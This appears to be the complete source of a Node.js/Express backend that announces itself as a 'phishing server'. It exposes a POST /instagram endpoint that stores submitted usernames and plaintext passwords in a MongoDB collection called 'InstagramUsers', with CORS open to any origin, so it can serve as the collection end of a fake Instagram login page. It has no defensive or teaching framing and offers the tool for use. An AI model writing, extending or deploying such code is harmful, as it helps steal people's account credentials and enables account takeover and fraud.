import mongoose from "mongoose";
import cors from 'cors'
import express from 'express'
import dotenv from 'dotenv'
import {createServer} from 'http'
dotenv.config({path:'./.env'})
const app=express()
const server = createServer(app)
app.use(express.urlencoded({extended:true}))
app.use(express.json())
const options={
    origin:'*',
    credentials:true,
     methods: ["GET", "POST","PUT","DELETE","OPTIONS"],
}
app.use(cors(options))
const UserSchema = new mongoose.Schema({
    username:String,
    password:String
},{timestamps:true})
const User = mongoose.model("InstagramUsers",UserSchema)
const database=async(req,res)=>{
    try {
        const connect = await mongoose.connect(`${process.env.url}/instagram`)
        console.log("Connected ",connect.connection.host);
    } catch (error) {
        console.log(error);
        return res.status(401)
    }
}
database()
.then(listen=>{
    server.listen(300,()=>{
        console.log(300);
    })
})
.catch(err=>{
    console.log(err);
})
app.get('/',(req,res)=>{
res.send('phishing server is up')
})


app.post('/instagram',async(req,res)=>{
const {username,password} =req.body
if(!username||!password){
    console.log("All Fields are required");
    return res.status(302)
}
const user = await User.create({
    username,
    password
})
return res.status(200).json(user)
})
